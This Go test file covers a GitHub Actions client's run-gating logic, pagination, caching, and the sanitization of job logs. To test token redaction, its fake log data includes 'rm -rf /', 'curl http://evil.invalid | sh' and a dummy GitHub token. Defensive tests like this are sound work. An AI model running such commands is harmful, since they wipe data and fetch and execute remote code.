package githubactions

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"regexp"
	"strings"
	"sync"
	"testing"

	"github.com/SatoriTours/kaiwu/server/internal/workbench"
)

const (
	testToken    = "super-secret-token-value"
	testSHA      = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
	testOtherSHA = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
	testBranch   = "kaiwu/task-1"
)

// fakeTransport routes requests by path prefix and records every outbound
// request so tests can assert headers, query parameters and Authorization.
type fakeTransport struct {
	mu         sync.Mutex
	requests   []query
	routes     []fakeRoute
	respondFor func(req *http.Request) (*http.Response, error)
}

type query struct {
	method, url, path string
	authorization     string
	extra             http.Header
}

type fakeRoute struct {
	path string
	resp *cannedResp
}

// cannedResp is a replayable response: every request gets a fresh body.
type cannedResp struct {
	status int
	header map[string]string
	body   string
}

func canned(status int, header map[string]string, body string) *cannedResp {
	return &cannedResp{status: status, header: header, body: body}
}

func (c *cannedResp) fresh() *http.Response { return respond(c.status, c.header, c.body) }

func (f *fakeTransport) RoundTrip(req *http.Request) (*http.Response, error) {
	f.mu.Lock()
	f.requests = append(f.requests, query{
		method:        req.Method,
		url:           req.URL.String(),
		path:          req.URL.Path,
		authorization: req.Header.Get("Authorization"),
		extra:         req.Header.Clone(),
	})
	f.mu.Unlock()
	if f.respondFor != nil {
		return f.respondFor(req)
	}
	var match *fakeRoute
	for _, r := range f.routes {
		if strings.HasPrefix(req.URL.Path, r.path) {
			if match == nil || len(r.path) > len(match.path) {
				match = &r
			}
		}
	}
	if match != nil {
		return match.resp.fresh(), nil
	}
	return &http.Response{StatusCode: 404, Header: http.Header{}, Body: io.NopCloser(strings.NewReader(`{}`))}, nil
}

// assertAPIHeaders requires media type and version headers on every api.github.com
// request, and requires Authorization there unless the test declared a bearer-
// exempt case.
func assertAPIHeaders(t *testing.T, f *fakeTransport, allowNoAuth bool) []query {
	t.Helper()
	f.mu.Lock()
	defer f.mu.Unlock()
	for _, r := range f.requests {
		if !strings.Contains(r.url, apiBase) {
			continue
		}
		if r.extra.Get("Accept") != "application/vnd.github+json" {
			t.Fatalf("request %s missing media type header", r.url)
		}
		if r.extra.Get("X-GitHub-Api-Version") != "2026-03-10" {
			t.Fatalf("request %s has API version %q", r.url, r.extra.Get("X-GitHub-Api-Version"))
		}
		if r.authorization != "Bearer "+testToken && !allowNoAuth {
			t.Fatalf("request %s missing bearer token", r.url)
		}
	}
	return f.requests
}

// authorizationOn reports whether any request to the given host carried the
// test token.
func (f *fakeTransport) authorizationOn(host string) bool {
	f.mu.Lock()
	defer f.mu.Unlock()
	for _, r := range f.requests {
		if strings.Contains(r.url, host) && strings.Contains(r.authorization, testToken) {
			return true
		}
	}
	return false
}

func respond(status int, header map[string]string, body string) *http.Response {
	h := http.Header{}
	for k, v := range header {
		h.Set(k, v)
	}
	if h.Get("Content-Type") == "" {
		h.Set("Content-Type", "application/json")
	}
	return &http.Response{StatusCode: status, Header: h, Body: io.NopCloser(strings.NewReader(body))}
}

func runJSON(id int64, attempt int, branch, sha, event, status, conclusion, created string) string {
	return fmt.Sprintf(`{"id":%d,"run_attempt":%d,"head_branch":%q,"head_sha":%q,"event":%q,"status":%q,"conclusion":%q,"workflow_id":11,"run_number":5,"created_at":%q,"updated_at":%q,"html_url":"https://github.com/owner/repo/actions/runs/%d","url":"https://api.github.com/repos/owner/repo/actions/runs/%d"}`,
		id, attempt, branch, sha, event, status, conclusion, created, created, id, id)
}

func runsPage(rows ...string) string {
	return `{"total_count":` + fmt.Sprint(len(rows)) + `,"workflow_runs":[` + strings.Join(rows, ",") + `]}`
}

func jobJSON(id int64, name, status, conclusion string) string {
	return fmt.Sprintf(`{"id":%d,"run_id":900,"run_attempt":1,"name":%q,"status":%q,"conclusion":%q,"head_sha":%q,"head_branch":%q,"html_url":"https://github.com/owner/repo/actions/runs/900/job/%d"}`,
		id, name, status, conclusion, testSHA, testBranch, id)
}

func jobsJSON(jobs ...string) string {
	return `{"total_count":` + fmt.Sprint(len(jobs)) + `,"jobs":[` + strings.Join(jobs, ",") + `]}`
}

func clientFor(rt http.RoundTripper) *Client {
	c, err := NewClient(ClientConfig{
		HTTP:  &http.Client{Transport: rt},
		Token: func(context.Context, string) (string, error) { return testToken, nil },
	})
	if err != nil {
		panic(err)
	}
	return c
}

func key(required ...workbench.DeliveryWorkflow) RunKey {
	if len(required) == 0 {
		required = []workbench.DeliveryWorkflow{{ID: 11}}
	}
	return RunKey{
		RepositoryID: 123, DeliveryID: "d1", Stage: "task",
		Owner: "owner", Repo: "repo", Branch: testBranch, SHA: testSHA,
		CredentialRef: "server_github_api", Required: required,
	}
}

func requiredJobWorkflow() []workbench.DeliveryWorkflow {
	return []workbench.DeliveryWorkflow{{ID: 11, Jobs: []string{"required-job"}}}
}

// TestActionsExactGate refuses every deviation from the exact gate.
func TestActionsExactGate(t *testing.T) {
	runList := "/repos/owner/repo/actions/workflows/11/runs"
	runJobs := "/repos/owner/repo/actions/runs/900/attempts/1/jobs"
	success := runJSON(900, 1, testBranch, testSHA, "push", "completed", "success", "2026-10-17T10:00:00Z")

	cases := []struct {
		name      string
		required  []workbench.DeliveryWorkflow
		routes    []fakeRoute
		wantState string
		wantCode  string
	}{
		{
			name:      "missing run waits for the trigger window",
			routes:    []fakeRoute{{path: runList, resp: canned(200, nil, runsPage())}},
			wantState: StateWaiting, wantCode: "no_matching_run",
		},
		{
			name:      "wrong sha rows do not gate the candidate",
			routes:    []fakeRoute{{path: runList, resp: canned(200, nil, runsPage(runJSON(900, 1, testBranch, testOtherSHA, "push", "completed", "success", "2026-10-17T10:00:00Z")))}},
			wantState: StateWaiting, wantCode: "no_matching_run",
		},
		{
			name:      "wrong branch rows are ignored",
			routes:    []fakeRoute{{path: runList, resp: canned(200, nil, runsPage(runJSON(900, 1, "main", testSHA, "push", "completed", "success", "2026-10-17T10:00:00Z")))}},
			wantState: StateWaiting, wantCode: "no_matching_run",
		},
		{
			name:      "pull request rows are not push runs",
			routes:    []fakeRoute{{path: runList, resp: canned(200, nil, runsPage(runJSON(900, 1, testBranch, testSHA, "pull_request", "completed", "success", "2026-10-17T10:00:00Z")))}},
			wantState: StateWaiting, wantCode: "no_matching_run",
		},
		{
			name:      "running run keeps the gate waiting",
			routes:    []fakeRoute{{path: runList, resp: canned(200, nil, runsPage(runJSON(900, 2, testBranch, testSHA, "push", "in_progress", "", "2026-10-17T10:00:00Z")))}},
			wantState: StateWaiting, wantCode: "not_completed",
		},
		{
			name:      "skipped required workflow blocks instead of passing",
			routes:    []fakeRoute{{path: runList, resp: canned(200, nil, runsPage(runJSON(900, 1, testBranch, testSHA, "push", "completed", "skipped", "2026-10-17T10:00:00Z")))}},
			wantState: StateBlocked, wantCode: "skipped",
		},
		{
			name:      "neutral required workflow blocks instead of passing",
			routes:    []fakeRoute{{path: runList, resp: canned(200, nil, runsPage(runJSON(900, 1, testBranch, testSHA, "push", "completed", "neutral", "2026-10-17T10:00:00Z")))}},
			wantState: StateBlocked, wantCode: "neutral",
		},
		{
			name:      "cancelled run fails without being repairable",
			routes:    []fakeRoute{{path: runList, resp: canned(200, nil, runsPage(runJSON(900, 1, testBranch, testSHA, "push", "completed", "cancelled", "2026-10-17T10:00:00Z")))}},
			wantState: StateFailed, wantCode: "cancelled",
		},
		{
			name:      "timed out run fails without being repairable",
			routes:    []fakeRoute{{path: runList, resp: canned(200, nil, runsPage(runJSON(900, 1, testBranch, testSHA, "push", "completed", "timed_out", "2026-10-17T10:00:00Z")))}},
			wantState: StateFailed, wantCode: "timed_out",
		},
		{
			name:      "action required run fails without being repairable",
			routes:    []fakeRoute{{path: runList, resp: canned(200, nil, runsPage(runJSON(900, 1, testBranch, testSHA, "push", "completed", "action_required", "2026-10-17T10:00:00Z")))}},
			wantState: StateFailed, wantCode: "action_required",
		},
		{
			name:      "stale run fails without being repairable",
			routes:    []fakeRoute{{path: runList, resp: canned(200, nil, runsPage(runJSON(900, 1, testBranch, testSHA, "push", "completed", "stale", "2026-10-17T10:00:00Z")))}},
			wantState: StateFailed, wantCode: "stale",
		},
		{
			name:      "required job skipped blocks the gate",
			required:  requiredJobWorkflow(),
			routes:    []fakeRoute{{path: runList, resp: canned(200, nil, runsPage(success))}, {path: runJobs, resp: canned(200, nil, jobsJSON(jobJSON(5001, "required-job", "completed", "skipped")))}},
			wantState: StateBlocked, wantCode: "required_job_skipped",
		},
		{
			name:      "required job missing from the run fails the gate",
			required:  requiredJobWorkflow(),
			routes:    []fakeRoute{{path: runList, resp: canned(200, nil, runsPage(success))}, {path: runJobs, resp: canned(200, nil, jobsJSON(jobJSON(5001, "unrelated-job", "completed", "success")))}},
			wantState: StateFailed, wantCode: "required_job_missing",
		},
		{
			name:      "required job failure fails the gate",
			required:  requiredJobWorkflow(),
			routes:    []fakeRoute{{path: runList, resp: canned(200, nil, runsPage(success))}, {path: runJobs, resp: canned(200, nil, jobsJSON(jobJSON(5001, "required-job", "completed", "failure")))}},
			wantState: StateFailed, wantCode: "failure",
		},
		{
			name:      "required job success passes the exact gate",
			required:  requiredJobWorkflow(),
			routes:    []fakeRoute{{path: runList, resp: canned(200, nil, runsPage(success))}, {path: runJobs, resp: canned(200, nil, jobsJSON(jobJSON(5001, "required-job", "completed", "success")))}},
			wantState: StatePassed, wantCode: "",
		},
		{
			name:      "exhausting the run pagination blocks instead of passing",
			routes:    []fakeRoute{{path: runList, resp: canned(200, map[string]string{"Link": `<https://api.github.com/repos/owner/repo/actions/workflows/11/runs?page=99>; rel="next"`}, runsPage())}},
			wantState: StateBlocked, wantCode: "pagination_incomplete",
		},
		{
			name:      "unauthorized observation blocks with auth code",
			routes:    []fakeRoute{{path: runList, resp: canned(401, nil, `{"message":"Bad credentials"}`)}},
			wantState: StateBlocked, wantCode: "auth_failed",
		},
		{
			name:      "forbidden observation blocks with forbidden code",
			routes:    []fakeRoute{{path: runList, resp: canned(403, nil, `{"message":"Forbidden"}`)}},
			wantState: StateBlocked, wantCode: "forbidden",
		},
		{
			name:      "rate limited observation blocks and honors retry after",
			routes:    []fakeRoute{{path: runList, resp: canned(429, map[string]string{"Retry-After": "7"}, `{"message":"Too many requests"}`)}},
			wantState: StateBlocked, wantCode: "rate_limited",
		},
		{
			name:      "server error observation blocks with server code",
			routes:    []fakeRoute{{path: runList, resp: canned(500, nil, `{"message":"boom"}`)}},
			wantState: StateBlocked, wantCode: "server_error",
		},
		{
			name:      "exact success with no required jobs passes",
			routes:    []fakeRoute{{path: runList, resp: canned(200, nil, runsPage(success))}},
			wantState: StatePassed, wantCode: "",
		},
		{
			name:      "newer failure is not masked by an older successful run",
			routes:    []fakeRoute{{path: runList, resp: canned(200, nil, runsPage(runJSON(801, 1, testBranch, testSHA, "push", "completed", "success", "2026-10-17T09:00:00Z"), runJSON(901, 1, testBranch, testSHA, "push", "completed", "failure", "2026-10-17T10:30:00Z")))}},
			wantState: StateFailed, wantCode: "failure",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			rt := &fakeTransport{routes: tc.routes}
			obs, err := clientFor(rt).Observe(context.Background(), key(tc.required...))
			if err != nil {
				t.Fatalf("Observe error: %v", err)
			}
			if obs.State != tc.wantState {
				t.Fatalf("state = %q, want %q (code %q)", obs.State, tc.wantState, obs.Code)
			}
			if tc.wantCode != "" && !strings.Contains(obs.Code, tc.wantCode) {
				t.Fatalf("code = %q, want containing %q", obs.Code, tc.wantCode)
			}
			assertAPIHeaders(t, rt, true)
		})
	}

	t.Run("inspect discovers disabled workflow and id mismatch", func(t *testing.T) {
		rt := &fakeTransport{routes: []fakeRoute{
			{path: "/repos/owner/repo", resp: canned(200, nil, `{"id":123,"full_name":"owner/repo","default_branch":"main"}`)},
			{path: "/repos/owner/repo/actions/workflows", resp: canned(200, nil, `{"total_count":2,"workflows":[{"id":11,"state":"disabled","path":".github/workflows/ci.yml","name":"CI"},{"id":12,"state":"active","path":".github/workflows/other.yml","name":"Other"}]}`)},
		}}
		c := clientFor(rt)
		info, err := c.Inspect(context.Background(), 123, "owner", "repo", "server_github_api")
		if err != nil {
			t.Fatalf("Inspect error: %v", err)
		}
		if info.ID != 123 || info.DefaultBranch != "main" {
			t.Fatalf("repo info: %+v", info)
		}
		if len(info.Blockers) == 0 {
			t.Fatal("disabled workflow must surface a blocker")
		}
		assertAPIHeaders(t, rt, false)

		_, err = c.Inspect(context.Background(), 999, "owner", "repo", "server_github_api")
		if err == nil {
			t.Fatal("repository id mismatch must fail")
		}
	})
}

// TestActionsCacheAttemptAndLatePages: pagination, 304, attempts and late
// results only ever gate the current candidate.
func TestActionsCacheAttemptAndLatePages(t *testing.T) {
	runList := "/repos/owner/repo/actions/workflows/11/runs"

	t.Run("attempt two running refuses cached one success", func(t *testing.T) {
		rt := &fakeTransport{routes: []fakeRoute{
			{path: runList, resp: canned(200, nil, runsPage(runJSON(900, 2, testBranch, testSHA, "push", "in_progress", "", "2026-10-17T10:00:00Z")))},
			{path: "/repos/owner/repo/actions/runs/900/attempts/1/jobs", resp: canned(200, nil, jobsJSON(jobJSON(5001, "required-job", "completed", "success")))},
		}}
		obs, err := clientFor(rt).Observe(context.Background(), key())
		if err != nil {
			t.Fatalf("Observe: %v", err)
		}
		if obs.State != StateWaiting {
			t.Fatalf("state %q, want waiting; an old attempt must not gate", obs.State)
		}
	})

	t.Run("etag 304 reuses the cached body and is not a new success", func(t *testing.T) {
		inProgress := runsPage(runJSON(900, 1, testBranch, testSHA, "push", "in_progress", "", "2026-10-17T10:00:00Z"))
		etag := `"etag-1"`
		mode := 0 // 0: serve 200, 1: serve 304
		rt := &fakeTransport{respondFor: func(req *http.Request) (*http.Response, error) {
			if !strings.Contains(req.URL.String(), apiBase) {
				return nil, fmt.Errorf("unexpected external request %s", req.URL)
			}
			if req.Header.Get("If-None-Match") != "" {
				return respond(304, nil, ""), nil
			}
			if mode == 0 {
				return respond(200, map[string]string{"ETag": etag}, inProgress), nil
			}
			mode = 1
			return respond(304, nil, ""), nil
		}}
		c := clientFor(rt)
		k := key()

		first, err := c.Observe(context.Background(), k)
		if err != nil {
			t.Fatalf("first Observe: %v", err)
		}
		if first.State != StateWaiting || first.Code != "not_completed" {
			t.Fatalf("first state %q code %q", first.State, first.Code)
		}
		// Server answers 304: the cached body (still running) must be reused
		// and the observation must not invent progress.
		second, err := c.Observe(context.Background(), k)
		if err != nil {
			t.Fatalf("second Observe: %v", err)
		}
		if second.State != StateWaiting || second.Code != "not_modified" {
			t.Fatalf("304 must reuse cached waiting state, got %q/%q", second.State, second.Code)
		}
	})

	t.Run("late pages with old sha success do not gate current sha", func(t *testing.T) {
		lateSuccess := runJSON(801, 1, testBranch, testOtherSHA, "push", "completed", "success", "2026-10-17T09:00:00Z")
		page := 0
		rt := &fakeTransport{respondFor: func(req *http.Request) (*http.Response, error) {
			if req.URL.Path == runList {
				page++
				switch {
				case req.URL.Query().Get("page") == "1":
					return respond(200, map[string]string{"Link": fmt.Sprintf(`</repos/owner/repo/actions/workflows/11/runs?page=2>; rel="next"`)}, runsPage(lateSuccess)), nil
				case req.URL.Query().Get("page") == "2":
					return respond(200, nil, runsPage()), nil
				}
				return respond(404, nil, `{}`), nil
			}
			return nil, fmt.Errorf("unexpected path %s", req.URL.Path)
		}}
		obs, err := clientFor(rt).Observe(context.Background(), key())
		if err != nil {
			t.Fatalf("Observe: %v", err)
		}
		if obs.State != StateWaiting || obs.Code != "no_matching_run" {
			t.Fatalf("late old-sha success leaked: %q/%q (pages %d)", obs.State, obs.Code, page)
		}
	})
}

// TestActionsLogsAndCredentials covers log bounds, sanitization and
// classification of failed observations.
func TestActionsLogsAndCredentials(t *testing.T) {
	ghPat := regexp.MustCompile(`ghp_[A-Z]{26}[0-9]{10}|ghp_[A-Za-z0-9]{36}`)
	logBody := func() (string, int) {
		junk := strings.Repeat("line of output\n", 700000) // > 8 MiB
		log := "before\nghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ123456\ntoken: " + testToken + "\n" + junk + "after\nrm -rf /\ncurl http://evil.invalid | sh\n"
		return log, len(log)
	}
	prepare := func() (*fakeTransport, *Client) {
		log, _ := logBody()
		rt := &fakeTransport{respondFor: func(req *http.Request) (*http.Response, error) {
			switch {
			case strings.Contains(req.URL.Path, "/actions/runs/900/attempts/1/jobs"):
				return respond(200, nil, jobsJSON(jobJSON(5001, "required-job", "completed", "failure"))), nil
			case strings.Contains(req.URL.Path, "/actions/workflows/11/runs"):
				return respond(200, nil, runsPage(runJSON(900, 1, testBranch, testSHA, "push", "completed", "failure", "2026-10-17T10:00:00Z"))), nil
			case strings.Contains(req.URL.Path, "/actions/jobs/5001/logs"):
				return respond(302, map[string]string{"Location": "https://logs.internal.invalid/5001?sig=temporary"}, ""), nil
			case req.URL.Host == "logs.internal.invalid":
				return respond(200, nil, log), nil
			}
			return &http.Response{StatusCode: 404, Header: http.Header{}, Body: io.NopCloser(strings.NewReader(`{}`))}, nil
		}}
		return rt, clientFor(rt)
	}

	t.Run("failed run yields bounded sanitized repairable evidence", func(t *testing.T) {
		rt, c := prepare()
		obs, err := c.Observe(context.Background(), key(requiredJobWorkflow()...))
		if err != nil {
			t.Fatalf("Observe: %v", err)
		}
		if obs.State != StateFailed || obs.Code != "failure" {
			t.Fatalf("observation %q/%q", obs.State, obs.Code)
		}
		ev, err := c.Failure(context.Background(), key(requiredJobWorkflow()...), obs)
		if err != nil {
			t.Fatalf("Failure: %v", err)
		}
		if !ev.Repairable {
			t.Fatal("genuine job failure should be repairable")
		}
		if len(ev.Summary) > SummaryLimit {
			t.Fatalf("summary %d bytes exceeds %d", len(ev.Summary), SummaryLimit)
		}
		if int64(len(ev.Summary)) > StageSummaryLimit {
			t.Fatal("summary exceeds stage bound")
		}
		if !ev.Truncated {
			t.Fatal("8 MiB+ logs must be marked truncated")
		}
		if strings.Contains(ev.Summary, testToken) {
			t.Fatal("token leaked into summary")
		}
		if ghp := ghPat.FindString(ev.Summary); ghp != "" {
			t.Fatalf("raw gh token %q leaked", ghp[:12])
		}
		if ev.Fingerprint == "" || len(ev.Fingerprint) != 64 {
			t.Fatalf("fingerprint invalid: %q", ev.Fingerprint)
		}
		if strings.Contains(ev.Summary, "sh` |") {
			t.Fatal("shell metachars must not be interpreted")
		}
		// Authorization must not follow the redirect to the log host.
		if rt.authorizationOn("logs.internal.invalid") {
			t.Fatal("Authorization forwarded to log host")
		}
		// The temporary URL is not part of the evidence record.
		if strings.Contains(ev.Summary, "sig=temporary") {
			t.Fatal("temporary download URL leaked into evidence")
		}
		// Evidence keys never include a URL field.
		if strings.Contains(structJSON(ev), `"url"`) || strings.Contains(structJSON(ev), `"url":`) {
			t.Fatal("evidence contains a URL field")
		}
		assertAPIHeaders(t, rt, false)
	})

	t.Run("failure evidence binds run attempt sha and job map", func(t *testing.T) {
		_, c := prepare()
		obs, err := c.Observe(context.Background(), key(requiredJobWorkflow()...))
		if err != nil {
			t.Fatalf("Observe: %v", err)
		}
		if len(obs.Runs) != 1 || obs.Runs[0].RunID != 900 || obs.Runs[0].Attempt != 1 || obs.Runs[0].SHA != testSHA {
			t.Fatalf("observation runs: %+v", obs.Runs)
		}
		if obs.Runs[0].Jobs["required-job"] != "failure" {
			t.Fatalf("job observation: %+v", obs.Runs[0].Jobs)
		}
	})

	t.Run("failure with no failed job is a protocol error", func(t *testing.T) {
		rt := &fakeTransport{routes: []fakeRoute{
			{path: "/repos/owner/repo/actions/runs/900/attempts/1/jobs", resp: canned(200, nil, jobsJSON(jobJSON(5001, "ok", "completed", "success")))},
		}}
		c := clientFor(rt)
		obs := Observation{State: StateFailed, Runs: []workbench.DeliveryCI{{
			DeliveryID: "d1", Stage: "task", RunID: 900, Attempt: 1, WorkflowID: 11,
			Jobs: map[string]string{"ok": "success"},
		}}}
		if _, err := c.Failure(context.Background(), key(), obs); err == nil {
			t.Fatal("Failure without a failed job must error")
		}
	})
}

func structJSON(v interface{}) string {
	b, err := json.Marshal(v)
	if err != nil {
		return ""
	}
	return string(b)
}
